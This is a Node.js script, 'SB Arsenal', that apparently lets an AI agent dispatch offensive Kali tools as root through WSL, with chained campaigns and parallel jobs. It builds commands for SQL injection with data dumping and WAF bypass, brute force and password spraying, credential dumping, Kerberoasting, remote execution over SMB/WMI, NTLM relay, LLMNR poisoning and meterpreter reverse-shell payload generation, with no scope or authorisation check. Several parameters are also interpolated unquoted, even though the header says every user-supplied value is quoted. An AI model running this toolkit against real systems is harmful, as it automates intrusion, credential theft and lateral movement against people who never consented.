#!/usr/bin/env node
/**
 * SB Arsenal — Direct Kali tool dispatch. No MCP server, no .bat, no middleman.
 *
 * Maps HexStrike's 150 tool names → direct Kali WSL shell commands.
 * Integrates with: SB Proxy v6, harness executor, or standalone CLI.
 *
 * Kali execution policy:
 *   - Every command runs as root: `wsl -d kali-linux -u root` (distro default
 *     user is unprivileged; never add sudo on top).
 *   - Commands launch directly; WSL starts the distro when needed.
 *   - Only a structured WSL launch error before Bash starts the command can
 *     trigger a readiness check and one retry. Tool failures are not replayed.
 *
 * Evidence: full stdout/stderr of every dispatch is written to
 *   <harness>/runs/arsenal/<runId>/<tool>.log
 * (override the dir with SB_RUNS_DIR, pin the runId with SB_RUN_ID) and every
 * entry is appended to <runId>/summary.json with its MITRE ATT&CK mapping and
 * severity counts extracted from nuclei-style output.
 *
 * Campaigns: `campaign --plan plan.json` runs steps sequentially; a step with
 * `feed_from: "<name>"` receives the previous step's stdout as a targets file
 * substituted into its params via the `{{TARGETS_FILE}}` token.
 * `parallel --file jobs.json` dispatches jobs through a worker pool.
 *
 * Usage (CLI):
 *   node sb-arsenal.cjs nmap_scan --target 10.10.10.5 --ports 22,80,443
 *   node sb-arsenal.cjs sqlmap_scan --url "https://target.com/page?id=1"
 *   node sb-arsenal.cjs campaign --plan plan.json
 *   node sb-arsenal.cjs parallel --file jobs.json --concurrency 4
 *   node sb-arsenal.cjs list
 *
 * Usage (module):
 *   const arsenal = require('./sb-arsenal.cjs');
 *   const result = await arsenal.dispatch('nmap_scan', { target: '10.10.10.5', ports: '22,80,443' });
 */

const { spawn, execSync } = require('child_process');
const path = require('path');
const fs = require('fs');

// ═══════════════════════════════════════════════════════════════
// SHELL HELPERS — quote every user-supplied value before interpolation
// ═══════════════════════════════════════════════════════════════

/** Single-quote a value for bash -c (safe against spaces, quotes, $(), backticks). */
const q = (v) => "'" + String(v ?? '').replace(/'/g, `'\\''`) + "'";

/** Windows path → WSL path (E:\x\y → /mnt/e/x/y). */
function toKaliPath(p) {
  const full = path.resolve(String(p));
  const drive = full[0].toLowerCase();
  return `/mnt/${drive}/${full.slice(3).replace(/\\/g, "/")}`;
}

// ═══════════════════════════════════════════════════════════════
// TOOL DEFINITIONS — maps to Kali WSL commands
// ═══════════════════════════════════════════════════════════════

const TOOLS = {
  // ── RECON ─────────────────────────────────────────────────
  "nmap_scan": {
    desc: "Port scan with service detection",
    params: ["target", "ports", "scan_type", "additional_args"],
    build: (p) => `nmap ${p.scan_type || "-sT"} ${p.ports ? "-p " + p.ports : "--top-ports 100"} ${p.additional_args || "-T4 -n --max-retries 1 --host-timeout 60s"} ${q(p.target)}`,
  },
  "nmap_advanced_scan": {
    desc: "Full NSE script scan",
    params: ["target", "ports", "scripts"],
    build: (p) => `nmap -sV -sC ${p.scripts ? "--script " + p.scripts : ""} ${p.ports ? "-p " + p.ports : ""} ${q(p.target)}`,
  },
  "masscan_scan": {
    desc: "Ultra-fast port scanner",
    params: ["target", "ports", "rate"],
    build: (p) => `masscan ${q(p.target)} ${p.ports ? "-p" + p.ports : "--top-ports 100"} --rate=${p.rate || 1000}`,
  },
  "subfinder_enum": {
    desc: "Subdomain enumeration",
    params: ["domain"],
    build: (p) => `subfinder -d ${q(p.domain)} -silent`,
  },
  "amass_enum": {
    desc: "Deep subdomain enumeration",
    params: ["domain"],
    build: (p) => `amass enum -passive -d ${q(p.domain)} 2>/dev/null | head -100`,
  },
  "httpx_probe": {
    desc: "HTTP probe + tech detection",
    params: ["target", "list_file"],
    build: (p) => p.list_file
      ? `httpx -l ${q(p.list_file)} -silent -title -tech-detect -status-code`
      : `echo ${q(p.target)} | httpx -silent -title -tech-detect -status-code`,
  },
  "dnsx_lookup": {
    desc: "DNS resolution",
    params: ["domain", "type"],
    build: (p) => `echo ${q(p.domain)} | dnsx ${p.type ? "-" + p.type : ""} -silent`,
  },
  "whatweb_fingerprint": {
    desc: "Technology fingerprinting",
    params: ["target"],
    build: (p) => `whatweb ${q(p.target)} 2>/dev/null | head -20`,
  },
  "theharvester_osint": {
    desc: "Email/subdomain/name harvesting",
    params: ["domain", "source"],
    build: (p) => `theHarvester -d ${q(p.domain)} -b ${q(p.source || "google")} 2>/dev/null | head -50`,
  },

  // ── WEB SCANNING ──────────────────────────────────────────
  "nuclei_scan": {
    desc: "Vulnerability scanner (CVE, misconfig)",
    params: ["target", "severity", "templates", "timeout"],
    build: (p) => `nuclei -u ${q(p.target)} -silent ${p.severity ? "-severity " + p.severity : "-severity critical,high,medium"} ${p.templates ? "-t " + p.templates : ""} -timeout ${p.timeout || 120}`,
  },
  "nuclei_list_scan": {
    desc: "Nuclei scan across a URL list file (chain-friendly)",
    params: ["list_file", "severity", "templates", "timeout"],
    build: (p) => `nuclei -l ${q(p.list_file)} -silent ${p.severity ? "-severity " + p.severity : "-severity critical,high,medium"} ${p.templates ? "-t " + p.templates : ""} -timeout ${p.timeout || 120}`,
  },
  "ffuf_dir": {
    desc: "Directory/file fuzzer",
    params: ["url", "wordlist", "timeout"],
    build: (p) => `ffuf -u ${q(p.url.includes("FUZZ") ? p.url : p.url + "/FUZZ")} -w ${q(p.wordlist || "/usr/share/seclists/Discovery/Web-Content/common.txt")} -t 50 -timeout ${p.timeout || 10} -fc 404 -s 2>/dev/null | head -50`,
  },
  "gobuster_dir": {
    desc: "Directory brute-force",
    params: ["url", "wordlist", "timeout"],
    build: (p) => `gobuster dir -u ${q(p.url)} -w ${q(p.wordlist || "/usr/share/seclists/Discovery/Web-Content/common.txt")} -q -t 30 --timeout ${p.timeout || 10}s 2>/dev/null | head -50`,
  },
  "feroxbuster_dir": {
    desc: "Fast recursive content discovery",
    params: ["url", "depth"],
    build: (p) => `feroxbuster -u ${q(p.url)} --depth ${p.depth || 2} --silent 2>/dev/null | head -50`,
  },
  "dirsearch_scan": {
    desc: "Web path discovery",
    params: ["url", "wordlist", "extensions"],
    build: (p) => `dirsearch -u ${q(p.url)} -t 30 ${p.wordlist ? "-w " + q(p.wordlist) : ""} ${p.extensions ? "-e " + p.extensions : ""} --quiet 2>/dev/null | head -60`,
  },
  "katana_crawl": {
    desc: "JavaScript-aware crawler (ProjectDiscovery)",
    params: ["url", "list_file", "depth", "js_parse"],
    build: (p) => `katana ${p.list_file ? "-list " + q(p.list_file) : "-u " + q(p.url)} -d ${p.depth || 3} -silent ${p.js_parse ? "-jc" : ""} 2>/dev/null | head -200`,
  },
  "gau_fetch": {
    desc: "Fetch known URLs from Wayback/Common Crawl",
    params: ["domain"],
    build: (p) => `gau ${q(p.domain)} 2>/dev/null | head -200`,
  },
  "wafw00f_detect": {
    desc: "Detect WAF in front of target",
    params: ["url"],
    build: (p) => `wafw00f ${q(p.url)} -a 2>/dev/null | head -30`,
  },
  "nikto_scan": {
    desc: "Web server vulnerability scan",
    params: ["target"],
    build: (p) => `nikto -h ${q(p.target)} -Format text 2>/dev/null | head -60`,
  },
  "wpscan_scan": {
    desc: "WordPress vulnerability scanner",
    params: ["url"],
    build: (p) => `wpscan --url ${q(p.url)} --no-banner 2>/dev/null | head -80`,
  },

  // ── SQL INJECTION ─────────────────────────────────────────
  "sqlmap_scan": {
    desc: "SQL injection testing",
    params: ["url", "data", "risk", "level", "dbs", "dump"],
    build: (p) => {
      let cmd = `sqlmap -u ${q(p.url)} --batch --risk=${p.risk || 1} --level=${p.level || 1} --threads=3`;
      if (p.data) cmd += ` --data=${q(p.data)}`;
      if (p.dbs) cmd += " --dbs";
      if (p.dump) cmd += " --dump";
      return cmd;
    },
  },
  "sqlmap_tamper": {
    desc: "SQLi with WAF bypass tamper",
    params: ["url", "tamper"],
    build: (p) => `sqlmap -u ${q(p.url)} --batch --tamper=${p.tamper || "space2comment,between,randomcase"} --risk=3 --level=3`,
  },

  // ── BRUTE FORCE ───────────────────────────────────────────
  "hydra_brute": {
    desc: "Login brute-force",
    params: ["target", "service", "user", "pass", "userlist", "passlist"],
    build: (p) => {
      const userPart = p.userlist ? `-L ${q(p.userlist)}` : `-l ${q(p.user || "admin")}`;
      const passPart = p.passlist ? `-P ${q(p.passlist)}` : `-p ${q(p.pass || "password")}`;
      return `hydra ${userPart} ${passPart} ${q(p.target)} ${p.service || "ssh"} -t 4 -W 3`;
    },
  },
  "hydra_http_form": {
    desc: "HTTP form brute-force",
    params: ["target", "form_path", "user_field", "pass_field", "fail_msg", "userlist", "passlist"],
    build: (p) => {
      const form = `${p.form_path}:${p.user_field || "user"}=^USER^&${p.pass_field || "password"}=^PASS^:${p.fail_msg || "incorrect"}`;
      const userPart = p.userlist ? `-L ${q(p.userlist)}` : "-l admin";
      const passPart = p.passlist ? `-P ${q(p.passlist)}` : "-p password";
      return `hydra ${userPart} ${passPart} ${q(p.target)} http-post-form ${q(form)} -t 4`;
    },
  },
  "john_crack": {
    desc: "Hash cracking (John)",
    params: ["hashfile", "wordlist", "format"],
    build: (p) => `john ${q(p.hashfile)} ${p.wordlist ? "--wordlist=" + q(p.wordlist) : ""} ${p.format ? "--format=" + p.format : ""} 2>/dev/null | head -30`,
  },
  "hashcat_crack": {
    desc: "GPU hash cracking",
    params: ["hashfile", "mode", "wordlist"],
    build: (p) => `hashcat -m ${p.mode || 0} ${q(p.hashfile)} ${q(p.wordlist || "/usr/share/wordlists/rockyou.txt")} --force 2>/dev/null | tail -20`,
  },

  // ── AD / WINDOWS ──────────────────────────────────────────
  "enum4linux_scan": {
    desc: "SMB/NetBIOS enumeration",
    params: ["target"],
    build: (p) => `enum4linux -a ${q(p.target)} 2>/dev/null | head -80`,
  },
  "smbclient_enum": {
    desc: "SMB share enumeration",
    params: ["target"],
    build: (p) => `smbclient -L ${q("//" + p.target)} -N 2>/dev/null`,
  },
  "crackmapexec_spray": {
    desc: "Password spray over SMB/WinRM/SSH",
    params: ["target", "protocol", "userlist", "passlist"],
    build: (p) => `crackmapexec ${p.protocol || "smb"} ${q(p.target)} -u ${q(p.userlist)} -p ${q(p.passlist)} --continue-on-success 2>/dev/null | head -40`,
  },
  "secretsdump": {
    desc: "Dump credentials (impacket)",
    params: ["target", "user", "pass", "domain"],
    build: (p) => `secretsdump.py ${q((p.domain ? p.domain + "/" : "") + (p.user || "guest") + ":" + (p.pass || "") + "@" + p.target)} 2>/dev/null | head -50`,
  },
  "GetUserSPNs": {
    desc: "Kerberoasting",
    params: ["target", "user", "pass", "domain"],
    build: (p) => `GetUserSPNs.py ${q((p.domain || ".") + "/" + p.user + ":" + p.pass + "@" + p.target)} -request 2>/dev/null`,
  },
  "psexec_exec": {
    desc: "Remote command execution (impacket)",
    params: ["target", "user", "pass", "domain", "command"],
    build: (p) => `psexec.py ${q((p.domain ? p.domain + "/" : "") + p.user + ":" + p.pass + "@" + p.target)} ${q(p.command || "whoami")} 2>/dev/null`,
  },
  "wmiexec_exec": {
    desc: "WMI remote execution",
    params: ["target", "user", "pass", "domain", "command"],
    build: (p) => `wmiexec.py ${q((p.domain ? p.domain + "/" : "") + p.user + ":" + p.pass + "@" + p.target)} ${q(p.command || "whoami")} 2>/dev/null`,
  },
  "ntlmrelayx": {
    desc: "NTLM relay attack (runs until timeout; kill with the run's timeout)",
    params: ["target", "smb_port"],
    build: (p) => `ntlmrelayx.py -tf ${q(p.target)} -smb2support 2>/dev/null`,
  },
  "bloodhound_collect": {
    desc: "AD graph collection",
    params: ["target", "user", "pass", "domain"],
    build: (p) => `bloodhound-python -u ${q(p.user)} -p ${q(p.pass)} -d ${q(p.domain)} -ns ${q(p.target)} -c All --zip 2>/dev/null`,
  },

  // ── EXPLOITATION ──────────────────────────────────────────
  "searchsploit_search": {
    desc: "Search Exploit-DB",
    params: ["query"],
    build: (p) => `searchsploit ${q(p.query)} 2>/dev/null | head -20`,
  },
  "msfvenom_payload": {
    desc: "Generate metasploit payload",
    params: ["platform", "arch", "format", "lhost", "lport", "payload"],
    build: (p) => `msfvenom -p ${q(p.payload || "windows/x64/meterpreter/reverse_tcp")} LHOST=${q(p.lhost || "10.0.0.1")} LPORT=${q(p.lport || 4444)} -f ${q(p.format || "raw")} ${p.platform ? "--platform " + q(p.platform) : ""} ${p.arch ? "-a " + q(p.arch) : ""} 2>/dev/null | xxd | head -20`,
  },

  // ── NETWORK ───────────────────────────────────────────────
  "arpspoof_mitm": {
    desc: "ARP spoofing (MITM)",
    params: ["target_ip", "gateway"],
    build: (p) => `echo ${q("arpspoof -i eth0 -t " + p.target_ip + " " + (p.gateway || "10.0.0.1") + " # requires root + manual run")}`,
  },
  "responder_capture": {
    desc: "LLMNR/NBT-NS poisoner (runs until timeout; kill with the run's timeout)",
    params: ["interface"],
    build: (p) => `responder -I ${q(p.interface || "eth0")} -dwv 2>/dev/null`,
  },
  "sslscan_target": {
    desc: "SSL/TLS vulnerability scan",
    params: ["target"],
    build: (p) => `sslscan ${q(p.target)} 2>/dev/null | head -30`,
  },
  "testssl_target": {
    desc: "Comprehensive TLS testing",
    params: ["target"],
    build: (p) => `testssl ${q(p.target)} 2>/dev/null | head -60`,
  },

  // ── FORENSICS ─────────────────────────────────────────────
  "binwalk_extract": {
    desc: "Firmware/binary extraction",
    params: ["file"],
    build: (p) => `binwalk ${q(p.file)} 2>/dev/null | head -20`,
  },
  "volatility_analyze": {
    desc: "Memory dump analysis",
    params: ["file", "profile", "plugin"],
    build: (p) => `volatility3 -f ${q(p.file)} ${p.plugin ? q(p.plugin) : "windows.info"} 2>/dev/null | head -30`,
  },
  "exiftool_metadata": {
    desc: "File metadata extraction",
    params: ["file"],
    build: (p) => `exiftool ${q(p.file)} 2>/dev/null`,
  },
  "steghide_extract": {
    desc: "Steganography extraction",
    params: ["file", "passphrase"],
    build: (p) => `steghide extract -sf ${q(p.file)} ${p.passphrase ? "-p " + q(p.passphrase) : ""} 2>/dev/null`,
  },

  // ── UTILITY ───────────────────────────────────────────────
  "curl_fetch": {
    desc: "HTTP request",
    params: ["url", "method", "headers", "data"],
    build: (p) => `curl -s ${p.method ? "-X " + p.method : ""} ${p.headers || ""} ${p.data ? "-d " + q(p.data) : ""} ${q(p.url)} 2>/dev/null | head -100`,
  },
  "dig_lookup": {
    desc: "DNS lookup",
    params: ["domain", "type", "server"],
    build: (p) => {
      const types = String(p.type || "A").split(/[,\s]+/).filter(Boolean);
      const server = p.server ? "@" + q(p.server) : "";
      return types.map(t => `dig ${q(p.domain)} ${q(t)} ${server} +noall +answer`).join("; ");
    },
  },
  "whois_lookup": {
    desc: "WHOIS information",
    params: ["domain"],
    build: (p) => `whois ${q(p.domain)} 2>/dev/null | head -30`,
  },
  "proxychains_nmap": {
    desc: "Nmap through proxy chain",
    params: ["target", "ports"],
    build: (p) => `proxychains nmap -sT -Pn ${p.ports ? "-p " + p.ports : ""} ${q(p.target)} 2>/dev/null`,
  },
};

// ═══════════════════════════════════════════════════════════════
// MITRE ATT&CK — coarse tool→technique mapping for run logs.
// Forensics utilities have no offensive technique; they map to null.
// ═══════════════════════════════════════════════════════════════

const MITRE = {
  nmap_scan: "T1046", nmap_advanced_scan: "T1046", masscan_scan: "T1046",
  proxychains_nmap: "T1090",
  subfinder_enum: "T1593.002", amass_enum: "T1593.002",
  dnsx_lookup: "T1590.002", dig_lookup: "T1590.002", whois_lookup: "T1596.002",
  theharvester_osint: "T1589.002",
  httpx_probe: "T1595.002", whatweb_fingerprint: "T1592.002", wafw00f_detect: "T1592.004",
  katana_crawl: "T1595.002", gau_fetch: "T1595.002",
  ffuf_dir: "T1595.002", gobuster_dir: "T1595.002", feroxbuster_dir: "T1595.002", dirsearch_scan: "T1595.002",
  nuclei_scan: "T1595.002", nuclei_list_scan: "T1595.002",
  nikto_scan: "T1595.002", wpscan_scan: "T1595.002",
  sslscan_target: "T1595.002", testssl_target: "T1595.002",
  sqlmap_scan: "T1190", sqlmap_tamper: "T1190",
  hydra_brute: "T1110.001", hydra_http_form: "T1110.001",
  john_crack: "T1110.002", hashcat_crack: "T1110.002",
  crackmapexec_spray: "T1110.003",
  enum4linux_scan: "T1135", smbclient_enum: "T1135",
  secretsdump: "T1003.003", GetUserSPNs: "T1558.006",
  psexec_exec: "T1021.002", wmiexec_exec: "T1021.006", ntlmrelayx: "T1187",
  bloodhound_collect: "T1087.002",
  responder_capture: "T1557.001", arpspoof_mitm: "T1557.002",
  msfvenom_payload: "T1587", searchsploit_search: "T1588.006",
  binwalk_extract: "T1592",
  volatility_analyze: null, exiftool_metadata: null, steghide_extract: null,
  curl_fetch: null,
};

// ═══════════════════════════════════════════════════════════════
// EXECUTION ENGINE — Kali WSL, root, cold-boot aware, evidence-backed
// ═══════════════════════════════════════════════════════════════

const RUNS_DIR = process.env.SB_RUNS_DIR || path.join(__dirname, "..", "runs", "arsenal");
const DEFAULT_TIMEOUT_MS = parseInt(process.env.SB_ARSENAL_TIMEOUT, 10) || 300000;
const PREVIEW_BYTES = 32 * 1024;

/** Structured WSL launch errors; ordinary tool output is not a retry signal. */
const WSL_FAIL = /\bWSL_E_[A-Z0-9_]+\b|\bWsl\/(?:Service|RegisterDistro|InstallDistro)\//i;
const COMMAND_STARTED = '\x1eDSH_ARSENAL_STARTED\x1f';

let runId = process.env.SB_RUN_ID || null;
let activeRunDir = null;

/** Recover readiness after WSL rejected a launch, without running a tool. */
function ensureKali() {
  for (const timeout of [90000, 120000]) {
    try {
      execSync("wsl -d kali-linux -u root -- true", { timeout, stdio: "pipe", windowsHide: true });
      return true;
    } catch { /* cold boot may exceed the first window; retry once */ }
  }
  return false;
}

/** One run directory per process/SB_RUN_ID; all dispatches inside share it. */
function getRunDir() {
  if (activeRunDir) return activeRunDir;
  if (!runId) runId = "arsenal-" + new Date().toISOString().replace(/[:.]/g, "-");
  activeRunDir = path.join(RUNS_DIR, runId);
  fs.mkdirSync(activeRunDir, { recursive: true });
  return activeRunDir;
}

/**
 * Run one command in Kali WSL as root. Resolves { success, output, stdout,
 * stderr, exitCode, elapsedMs, commandStarted }; never rejects.
 */
function runInKali(command, timeoutMs = DEFAULT_TIMEOUT_MS) {
  return new Promise((resolve) => {
    const started = Date.now();
    // The private stderr marker prevents replay after the tool has started.
    const script = "printf '\\036DSH_ARSENAL_STARTED\\037' >&2\n" + command;
    const proc = spawn("wsl", ["-d", "kali-linux", "-u", "root", "--", "bash", "-c", script], {
      windowsHide: true,
      stdio: ["pipe", "pipe", "pipe"],
      timeout: timeoutMs,
    });

    let out = "", err = "";
    proc.stdout.on("data", d => { if (out.length < 2 * 1024 * 1024) out += d; });
    proc.stderr.on("data", d => { if (err.length < 256 * 1024) err += d; });

    proc.on("close", (code) => {
      const commandStarted = err.includes(COMMAND_STARTED);
      err = err.replace(COMMAND_STARTED, '');
      resolve({ success: code === 0, output: out || err, stdout: out, stderr: err, exitCode: code, elapsedMs: Date.now() - started, commandStarted });
    });
    proc.on("error", (e) => resolve({ success: false, output: e.message, error: e.message, elapsedMs: Date.now() - started, commandStarted: false }));
  });
}

/** Count nuclei-style severity markers in tool output. */
function countSeverities(text) {
  const counts = { critical: 0, high: 0, medium: 0, low: 0, info: 0 };
  let m; const re = /\[(critical|high|medium|low|info)\]/g;
  while ((m = re.exec(text || ""))) counts[m[1]]++;
  return counts;
}

function preview(text) {
  return text.length > PREVIEW_BYTES ? text.slice(0, PREVIEW_BYTES) + "\n...[truncated, see logPath]" : text;
}

/** Append one evidence entry to <runDir>/summary.json (bounded to 500). */
function recordSummary(dir, entry) {
  const file = path.join(dir, "summary.json");
  let bundle = { runId: path.basename(dir), startedAt: entry.at, entries: [] };
  try { bundle = JSON.parse(fs.readFileSync(file, "utf8")); } catch { /* first entry or truncated file: start fresh */ }
  bundle.entries.push(entry);
  if (bundle.entries.length > 500) bundle.entries = bundle.entries.slice(-500);
  fs.writeFileSync(file, JSON.stringify(bundle, null, 2));
  return file;
}

async function dispatch(toolName, params = {}) {
  const tool = TOOLS[toolName];
  if (!tool) return { success: false, error: `Unknown tool: ${toolName}. Use 'list' to see available tools.` };

  const command = tool.build(params);
  console.log(`[arsenal] ${toolName}: ${command}`);

  const timeoutMs = parseInt(params.exec_timeout, 10) || DEFAULT_TIMEOUT_MS;
  let result = await runInKali(command, timeoutMs);

  if (!result.success && !result.commandStarted && WSL_FAIL.test(
    [result.stdout, result.stderr, result.error].filter(Boolean).join('\n').replace(/\0/g, ''),
  )) {
    if (ensureKali()) result = await runInKali(command, timeoutMs);
  }

  result.tool = toolName;
  result.command = command;

  const dir = getRunDir();
  const logName = String(params.log_name || toolName).replace(/[^a-zA-Z0-9._-]/g, "_");

  // Full evidence to disk; preview stays in memory for the agent.
  try {
    const logPath = path.join(dir, `${logName}.log`);
    const body = `# ${new Date().toISOString()} ${toolName}\n# command: ${command}\n# exitCode: ${result.exitCode} elapsedMs: ${result.elapsedMs}\n\n${result.stdout}\n--- stderr ---\n${result.stderr}`;
    fs.writeFileSync(logPath, body);
    result.logPath = logPath;
    result.logBytes = Buffer.byteLength(body);
  } catch (e) {
    result.evidenceError = e.message;
  }

  const findings = countSeverities(result.stdout);
  const findingsTotal = Object.values(findings).reduce((a, b) => a + b, 0);
  if (findingsTotal > 0) result.findings = findings;

  try {
    const entry = {
      tool: toolName,
      name: logName,
      command,
      success: result.success,
      exitCode: result.exitCode ?? null,
      elapsedMs: result.elapsedMs,
      mitre: MITRE[toolName] ?? null,
      findings,
      logPath: result.logPath || null,
      at: new Date().toISOString(),
    };
    result.summaryPath = recordSummary(dir, entry);
    result.runId = path.basename(dir);
  } catch (e) {
    result.evidenceError = result.evidenceError || e.message;
  }

  result.output = preview(result.stdout || result.stderr || result.output || "");
  return result;
}

/**
 * Dispatch jobs through a worker pool. jobs: [{ name?, tool, params? }].
 * Each job gets its own evidence log via its name (defaults to tool name).
 */
async function dispatchAll(jobs, { concurrency = 4, stop_on_fail = false } = {}) {
  if (!Array.isArray(jobs) || jobs.length === 0) return { success: false, error: "jobs must be a non-empty array" };
  const results = new Array(jobs.length);
  let next = 0;
  const worker = async () => {
    while (next < jobs.length) {
      const i = next++;
      const job = jobs[i] || {};
      results[i] = await dispatch(job.tool, { ...(job.params || {}), log_name: job.name || (job.params && job.params.log_name) || job.tool });
      if (!results[i].success && stop_on_fail) next = jobs.length;
    }
  };
  await Promise.all(Array.from({ length: Math.max(1, Math.min(concurrency, jobs.length)) }, worker));
  return { success: results.every(r => r && r.success), results };
}

/**
 * Run a plan sequentially. plan: { name?, steps: [{ name, tool, params?,
 * feed_from? }] }. A step's stdout is kept as <name>.targets.txt; a later step
 * with feed_from gets that file's Kali path substituted for every
 * `{{TARGETS_FILE}}` token in its params. Fails a step (and the campaign with
 * stop_on_fail) on unknown tools, missing feed sources, or dispatch errors.
 */
async function campaign(plan, { stop_on_fail = true } = {}) {
  if (!plan || !Array.isArray(plan.steps) || plan.steps.length === 0) {
    return { success: false, error: "campaign needs plan.steps = [{ name, tool, params?, feed_from? }]" };
  }
  const dir = getRunDir();
  const steps = [];
  let allOk = true;

  for (const step of plan.steps) {
    const name = String(step.name || step.tool);
    const tool = TOOLS[step.tool];
    if (!tool) {
      steps.push({ name, tool: step.tool, success: false, error: "unknown tool" });
      allOk = false;
      if (stop_on_fail) break;
      continue;
    }

    const params = { ...(step.params || {}) };
    if (step.feed_from) {
      const src = steps.find(s => s.name === step.feed_from);
      if (!src || !src.targetsFile) {
        steps.push({ name, tool: step.tool, success: false, error: `feed_from '${step.feed_from}' produced no targets file` });
        allOk = false;
        if (stop_on_fail) break;
        continue;
      }
      for (const [k, v] of Object.entries(params)) {
        if (typeof v === "string") params[k] = v.replaceAll("{{TARGETS_FILE}}", toKaliPath(src.targetsFile));
      }
    }

    const result = await dispatch(step.tool, { ...params, log_name: name });
    const entry = { name, tool: step.tool, success: result.success, exitCode: result.exitCode ?? null, elapsedMs: result.elapsedMs, logPath: result.logPath || null, mitre: MITRE[step.tool] ?? null };
    if (result.findings) entry.findings = result.findings;
    if (result.error) entry.error = result.error;

    if (result.success && result.stdout && result.stdout.trim()) {
      entry.targetsFile = path.join(dir, `${name}.targets.txt`);
      fs.writeFileSync(entry.targetsFile, result.stdout.trimEnd() + "\n");
    }
    steps.push(entry);

    if (!result.success) {
      allOk = false;
      if (stop_on_fail) break;
    }
  }

  const summary = {
    runId: path.basename(dir),
    plan: plan.name || "unnamed",
    startedAt: steps.length ? steps[0].at || null : null,
    steps,
  };
  const campaignResult = { success: allOk, plan: plan.name || "unnamed", steps, runDir: dir, summary };
  try {
    const campaignResultPath = path.join(dir, "campaign-result.json");
    fs.writeFileSync(campaignResultPath, JSON.stringify(campaignResult, null, 2));
    campaignResult.campaignResultPath = campaignResultPath;
  } catch { /* summary.json already holds the step entries */ }
  return campaignResult;
}

function listTools() {
  const categories = {};
  for (const [name, tool] of Object.entries(TOOLS)) {
    const cat = tool.desc.split(" ")[0].toLowerCase();
    if (!categories[cat]) categories[cat] = [];
    categories[cat].push({ name, desc: tool.desc });
  }
  return { total: Object.keys(TOOLS).length, categories };
}

// ═══════════════════════════════════════════════════════════════
// CLI
// ═══════════════════════════════════════════════════════════════

function readJsonFlag(args, flag) {
  const i = args.indexOf(flag);
  if (i === -1) return null;
  const file = args[i + 1];
  if (!file) return { error: `${flag} needs a file path` };
  try {
    return JSON.parse(fs.readFileSync(file, "utf8"));
  } catch (e) {
    return { error: `cannot read ${file}: ${e.message}` };
  }
}

if (require.main === module) {
  const args = process.argv.slice(2);
  const cmd = args[0];

  if (!cmd || cmd === "list") {
    const info = listTools();
    console.log(`\nSB Arsenal — ${info.total} tools available\n`);
    for (const [cat, tools] of Object.entries(info.categories)) {
      console.log(`  ${cat}:`);
      tools.forEach(t => console.log(`    ${t.name.padEnd(25)} ${t.desc}`));
    }
    console.log(`\nUsage: node sb-arsenal.cjs <tool> --param value ...`);
    console.log(`       node sb-arsenal.cjs campaign --plan plan.json`);
    console.log(`       node sb-arsenal.cjs parallel --file jobs.json --concurrency 4`);
    process.exit(0);
  }

  if (cmd === "campaign") {
    const plan = readJsonFlag(args, "--plan");
    if (plan && plan.error) { console.error(`Error: ${plan.error}`); process.exit(1); }
    const stopOnFail = !args.includes("--continue-on-fail");
    campaign(plan, { stop_on_fail: stopOnFail }).then(result => {
      for (const s of result.steps) {
        console.error(`[step] ${s.name.padEnd(20)} ${s.tool.padEnd(20)} ${s.success ? "OK" : "FAIL"} exit=${s.exitCode} ${s.elapsedMs}ms${s.findings ? ` findings=${JSON.stringify(s.findings)}` : ""}${s.error ? ` error=${s.error}` : ""}`);
      }
      console.error(`[campaign] ${result.success ? "OK" : "FAIL"} runDir=${result.runDir}${result.campaignResultPath ? ` result=${result.campaignResultPath}` : ""}`);
      console.log(JSON.stringify(result, null, 2));
      process.exit(result.success ? 0 : 1);
    });
  } else if (cmd === "parallel") {
    const jobs = readJsonFlag(args, "--file");
    if (jobs && jobs.error) { console.error(`Error: ${jobs.error}`); process.exit(1); }
    const ci = args.indexOf("--concurrency");
    const concurrency = ci !== -1 ? parseInt(args[ci + 1], 10) || 4 : 4;
    dispatchAll(jobs, { concurrency }).then(result => {
      for (const s of result.results) {
        console.error(`[job] ${String(s.tool).padEnd(20)} ${s.success ? "OK" : "FAIL"} exit=${s.exitCode} ${s.elapsedMs}ms${s.findings ? ` findings=${JSON.stringify(s.findings)}` : ""}`);
      }
      console.error(`[parallel] ${result.success ? "OK" : "FAIL"}`);
      console.log(JSON.stringify(result, null, 2));
      process.exit(result.success ? 0 : 1);
    });
  } else {
    // Parse --param value pairs
    const params = {};
    for (let i = 1; i < args.length; i++) {
      if (args[i].startsWith("--")) {
        const key = args[i].substring(2);
        const value = args[i + 1] && !args[i + 1].startsWith("--") ? args[++i] : true;
        params[key] = value;
      }
    }

    dispatch(cmd, params).then(result => {
      if (result.logPath) console.error(`[evidence] ${result.logPath} (${result.logBytes} bytes)`);
      if (result.success) {
        console.log(result.output);
      } else {
        console.error(`Error: ${result.error || result.output}`);
        process.exit(1);
      }
    });
  }
}

module.exports = { TOOLS, MITRE, dispatch, dispatchAll, campaign, listTools, runInKali };
